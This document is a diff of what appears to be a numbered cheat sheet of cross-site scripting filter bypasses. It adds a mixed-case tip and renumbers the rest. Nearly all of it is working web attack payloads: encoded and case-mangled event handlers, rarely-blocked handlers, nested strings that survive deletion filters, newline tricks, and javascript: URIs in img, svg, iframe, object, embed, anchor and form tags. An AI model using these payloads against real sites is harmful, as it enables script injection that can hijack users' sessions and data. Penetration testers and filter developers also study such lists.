@@ -1,26 +1,30 @@
 Tip 1 uppercase :
 onerror ==> block
-ONerror ==> allow
+ONERROR ==> allow
 
-Tip 2 encode hex:
+Tip 2 mix uppercase with lowercase:
+onerror ==> block
+OnErROr ==> allow
+
+Tip 3 encode hex:
 onerror ==> block
 ONerror ==> block
 ON%65rror ==> allow
 
-Tip 3 double encode hex:
+Tip 4 double encode hex:
 onerror ==> block
 ONerror ==> block
 ON%65rror ==> block
 ON%2565rror ==> allow
 
-Tip 4 encode html:
+Tip 5 encode html:
 onerror ==> block
 ONerror ==> block
 ON%65rror ==> block
 ON%2565rror ==> block
 &#79;nerror ==> allow
 
-Tip 5 encode hex + encode html
+Tip 6 encode hex + encode html
 onerror ==> block
 ONerror ==> block
 ON%65rror ==> block
@@ -28,27 +32,27 @@ ON%2565rror ==> block
 &#79;nerror ==> block
 %26%2379%3Bnerror ==> allow
 
-Tip 6 bypass black list:
+Tip 7 bypass black list:
 onerror ==> block.
 onload ==> block.
 ...
 ...
 onauxclick ==> allow.
 
-Tip 7 delete eventhandler:
+Tip 8 delete eventhandler:
 onerror ==> delete
 oneonerrorrror ==> onerror ==> allow
 
-Tip 8 add string:
+Tip 9 add string:
 onerror ==> ononerror
 error ==> onerror ==> bypass
 
-Tip 9 delete tag:
+Tip 10 delete tag:
 onerror ==> block
 <script> ==> delete
 one<script>rror ==> allow
 
-Tip 10 bypass between tag <>:
+Tip 11 bypass between tag <>:
 <img src=1 onerror=alert(4)> ==> block onerror.
 <img src=x onerror=alert(4)%0a ==>
 allow
@@ -56,52 +60,42 @@ OR
 <svg onload=alert(4)
 You can change %0a to %09,%0c,%0d,//
 
-Tip 11 bypass space:
+Tip 12 bypass space:
 <...... onerror=alert(4)> block
 <......%0aonerror=alert(4)> allow
 
-Tip 12 bypass length 1:
+Tip 13 bypass length 1:
 onxxx==>block (length >=5)
 onxx==> allow (length <5)
 <iframe src=javascript:alert(4)> allow
   
-Tip 13 bypass length 2:
+Tip 14 bypass length 2:
 onxxx==>block (length >=5)
 onxx==> allow (length <5)
-<iframe src=javascript:alert(4)> block
 <script/**b4walid**/>alert(4)</script> allow
 
-Tip 14 bypass length 3:
+Tip 15 bypass length 3:
 onxxx==>block (length >=5)
 onxx==> allow (length <5)
-<iframe src=javascript:alert(4)> block
-<script/**b4walid**/>alert(4)</script> block
 <object data=javascript:alert(4)> allow
   
-Tip 15 bypass length 4:
+Tip 16 bypass length 4:
 onxxx==>block (length >=5)
 onxx==> allow (length <5)
-<iframe src=javascript:alert(4)> block
-<script>alert(4)</script> block
-<object data=""> block
 <embed src=javascript:alert(4)> allow
   
-Tip 16 bypass length 5:
+Tip 17 bypass length 5:
 onxxx==>block (length >=5)
 onxx==> allow (length <5)
-<iframe src=> block
-<script>alert(4)</script> block
-<object data=""> block
-<embed src=""> block
-<a href=javascript:alert(4)>click</a>
+<a href=javascript:alert(4)>click</a> allow
   
-Tip 17 bypass length 6:
+Tip 18 bypass length 6:
 onxxx==>block (length >=5)
 onxx==> allow (length <5)
 block all precedent tips.
 <form action=javascript:alert(0)><input type=submit> allow
   
-Tip 18 bypass length 8:
+Tip 19 bypass length 8:
 onxxx==>block (length >=5)
 onxx==> allow (length <5)
 block all precedent tips.
